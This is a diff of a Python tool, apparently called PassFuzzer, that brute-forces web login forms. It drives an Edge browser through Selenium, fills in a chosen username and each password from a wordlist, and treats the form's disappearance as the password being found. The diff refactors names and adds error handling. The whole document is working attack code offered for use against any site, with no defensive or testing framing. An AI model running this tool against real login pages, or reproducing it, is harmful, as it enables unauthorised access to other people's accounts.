@@ -1,16 +1,11 @@
 import sys
 import datetime
-import selenium
 import requests
-import time as t
-from sys import stdout
 from selenium import webdriver
 from optparse import OptionParser
-from selenium.webdriver.common.keys import Keys
 from selenium.webdriver.common.by import By
-from selenium.webdriver.chrome.service import Service
+from selenium.webdriver.edge.service import Service
 from selenium.common.exceptions import NoSuchElementException
-
 
 # Graphics
 class color:
@@ -24,7 +19,7 @@ class color:
     BOLD = '\033[1m'
     UNDERLINE = '\033[4m'
     END = '\033[0m'
-    CWHITE = '\33[37m'
+    WHITE = '\33[37m'
 
 
 # Config#
@@ -33,89 +28,101 @@ now = datetime.datetime.now()
 
 
 # Args
-parser.add_option("-u", "--username", dest="username", help="Choose the username")
-parser.add_option("--usernamesel", dest="usernamesel", help="Choose the username selector")
-parser.add_option("--passsel", dest="passsel", help="Choose the password selector")
-parser.add_option("--loginsel", dest="loginsel", help="Choose the login button selector")
-parser.add_option("--passlist", dest="passlist", help="Enter the password list directory")
-parser.add_option("--website", dest="website", help="choose a website")
-(options, args) = parser.parse_args()
+parser.add_option('-l', '--username', dest='username',
+                  help='Choose the username')
+parser.add_option('-u', '--usernamesel', dest='usernamesel',
+                  help='Choose the username selector')
+parser.add_option('-p', '--passsel', dest='passsel',
+                  help='Choose the password selector')
+parser.add_option('-b', '--loginsel', dest='loginsel',
+                  help='Choose the login button selector')
+parser.add_option('-P', '--passlist', dest='passlist',
+                  help='Enter the password list directory')
+parser.add_option('-w', '--website', dest='website', help='choose a website')
+(c_options, args) = parser.parse_args()
 
 BROWSER_DVR_DIR = 'C:\\webdrivers\\BROWSERdriver.exe'
 
 
 def wizard():
     print(banner)
-    website = input(color.GREEN + color.BOLD + '\n[~] ' + color.CWHITE + 'Enter a website: ')
-    sys.stdout.write(color.GREEN + '[!] ' + color.CWHITE + 'Checking if site exists ')
+    website = input(
+        f'{color.GREEN + color.BOLD}\n[~] {color.WHITE}Enter a website: ')
+    sys.stdout.write(f'{color.YELLOW}[?] {color.WHITE}Checking if site exists ')
     sys.stdout.flush()
-    t.sleep(1)
     try:
         request = requests.get(website)
         if request.status_code == 200:
-            print(color.GREEN + '[OK]'+color.CWHITE)
+            print(f'{color.GREEN}[OK] {color.WHITE}')
             sys.stdout.flush()
     except NoSuchElementException:
         pass
+    except requests.exceptions.MissingSchema:
+        print(f'{color.RED}[X] \n[!] {color.WHITE}Invalid URL. Make sure you use http/https only.')
+        exit(1)
+    except requests.ConnectTimeout:
+        print(color.RED + '[X]' + color.YELLOW +
+              '\n[!] '+color.WHITE + 'Connection timed out')
+        exit(1)
     except KeyboardInterrupt:
-        print(color.RED + '[!]'+color.CWHITE + 'User used Ctrl-c to exit')
+        print(color.RED + '[!] ' + color.WHITE + 'Exited upon user request...')
         exit()
     except:
-        t.sleep(1)
-        print(color.RED + '[X]'+color.CWHITE)
-        t.sleep(1)
-        print(color.RED + '[!]'+color.CWHITE + ' Website could not be located make sure to use http / https')
+        print(color.RED + '[X]' + color.WHITE)
+        print(color.RED + '[!]' + color.WHITE +
+              ' Website could not be located make sure to use http / https')
         exit()
 
-    username_selector = input(
-        color.GREEN + '[~] ' + color.CWHITE + 'Enter the username selector: ')
-    password_selector = input(
-        color.GREEN + '[~] ' + color.CWHITE + 'Enter the password selector: ')
-    login_btn_selector = input(
-        color.GREEN + '[~] ' + color.CWHITE + 'Enter the Login button selector: ')
-    username = input(
-        color.GREEN + '[~] ' + color.CWHITE + 'Enter the username to brute-force: ')
-    pass_list = input(
-        color.GREEN + '[~] ' + color.CWHITE + 'Enter a directory to a password list: ')
-    brutes(username, username_selector, password_selector,
-           login_btn_selector, pass_list, website)
+    userStr = input(
+        color.GREEN + '[~] ' + color.WHITE + 'Enter the username selector: ')
+    passStr = input(
+        color.GREEN + '[~] ' + color.WHITE + 'Enter the password selector: ')
+    lBtnStr = input(
+        color.GREEN + '[~] ' + color.WHITE + 'Enter the Login button selector: ')
+    user = input(
+        color.GREEN + '[~] ' + color.WHITE + 'Enter the username to brute-force: ')
+    passList = input(
+        color.GREEN + '[~] ' + color.WHITE + 'Enter a directory to a password list: ')
+    brutes(user, userStr, passStr, lBtnStr, passList, website)
 
 
-def brutes(username, username_selector, password_selector, login_btn_selector, pass_list, website):
-    f = open(pass_list, 'r')
-    driver = Service(BROWSER_DVR_DIR)
-    optionss = webdriver.EdgeOptions()
-    optionss.add_experimental_option('excludeSwitches', ['enable-logging'])
-    optionss.add_argument("--disable-popup-blocking")
-    optionss.add_argument("--disable-extensions")
-    count = 1  # count
-    browser = webdriver.Edge(service = driver) #type: ignore
-    temp = ""
+def brutes(uName, unameStr, passStr, lBtnStr, passList, website):
+    options = webdriver.EdgeOptions()
+    options.add_experimental_option('excludeSwitches', ['enable-logging'])
+    passFile = open(passList, 'r')
+    try:
+        global driver
+        driver = Service(BROWSER_DVR_DIR)
+    except:
+        print(
+            f'{color.RED}\n[?] {color.WHITE}Webdriver binary couldn\'t be found.')
+    browser = webdriver.Edge(service=driver)
+    temp = ''
+    browser.get(website)
     while True:
         try:
-            for line in f:
-                browser.get(website)
-                t.sleep(2)
-                Sel_user = browser.find_element(By.NAME, username_selector)
-                Sel_pas = browser.find_element(By.NAME, password_selector)
-                enter = browser.find_element(By.NAME, login_btn_selector)
-                Sel_user.send_keys(username)
-                Sel_pas.send_keys(line)
-                t.sleep(5)
-                print('-'*30)
-                print(color.GREEN + 'Tried password: '+ color.RED + line + color.GREEN + 'for user: '+color.RED + username)
-                print('-'*30)
-                temp = line
+            for passTryOption in passFile:
+                try:
+                    UserSltr = browser.find_element(By.NAME, unameStr)
+                    PassSltr = browser.find_element(By.NAME, passStr)
+                    btn = browser.find_element(By.NAME, lBtnStr)
+                    UserSltr.send_keys(uName)
+                    PassSltr.send_keys(passTryOption)
+                    temp = passTryOption
+                    print(f'{color.CYAN}Tried: {color.WHITE + temp}')
+                except KeyboardInterrupt:
+                    print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
+                    exit()
+                except NoSuchElementException:
+                    print(
+                        f'{color.CYAN}Password has been found: {color.WHITE + temp}')
+                    exit()
         except KeyboardInterrupt:
-            exit()
-        except NoSuchElementException:
-            print('AN ELEMENT HAS BEEN REMOVED FROM THE PAGE SOURCE THIS COULD MEAN 2 THINGS THE PASSWORD WAS FOUND OR YOU HAVE BEEN LOCKED OUT OF ATTEMPTS! ')
-            print('LAST PASS ATTEMPT BELLOW')
-            print(color.GREEN + 'Password has been found: {0}'.format(temp))
-            print(color.YELLOW + 'Have fun :)')
+            print(f'{color.RED}[#] {color.WHITE}Exited upon user request...')
             exit()
 
-banner = color.BOLD + color.RED + '''
+
+banner = color.BOLD + color.YELLOW + '''
  ######                           #######                                         
  #     #    ##     ####    ####   #        #    #  ######  ######  ######  #####  
  #     #   #  #   #       #       #        #    #      #       #   #       #    # 
@@ -124,34 +131,29 @@ banner = color.BOLD + color.RED + '''
  #        #    #  #    #  #    #  #        #    #   #       #      #       #   #  
  #        #    #   ####    ####   #         ####   ######  ######  ######  #    # 
 
-{2} Password Brute-force tool
-{2} Version 1.0
-{1} Author: Sparky99
-{1} Based on: Hatch [By: MetaChar]
-'''.format(color.RED, color.CWHITE, color.GREEN,)
+{0} Password Brute-force tool
+{0} Version 1.0
+{0} Author: Sparky99
+'''.format(color.CYAN)
 
-driver = Service(BROWSER_DVR_DIR)
-browser = webdriver.Edge(service = driver) #type: ignore
-optionss = webdriver.EdgeOptions()
-optionss.add_experimental_option('excludeSwitches', ['enable-logging'])
-optionss.add_argument("--disable-popup-blocking")
-optionss.add_argument("--disable-extensions")
-count = 1  # count
-
-if options.username == None:
-    if options.usernamesel == None:
-        if options.passsel == None:
-            if options.loginsel == None:
-                if options.passlist == None:
-                    if options.website == None:
-                        wizard()
+if c_options.username == None:
+    if c_options.usernamesel == None:
+        if c_options.passsel == None:
+            if c_options.loginsel == None:
+                if c_options.passlist == None:
+                    if c_options.website == None:
+                        try:
+                            wizard()
+                        except KeyboardInterrupt:
+                            print(f'{color.RED}\n[#] {color.WHITE}Exited upon user request...')
+                            exit()
 
 
-username = options.username
-username_selector = options.usernamesel
-password_selector = options.passsel
-login_btn_selector = options.loginsel
-website = options.website
-pass_list = options.passlist
+user = c_options.username
+userStr = c_options.usernamesel
+passStr = c_options.passsel
+lBtnStr = c_options.loginsel
+website = c_options.website
+passList = c_options.passlist
 print(banner)
-brutes(username, username_selector, password_selector,login_btn_selector, pass_list, website)
+brutes(user, userStr, passStr, lBtnStr, passList, website)
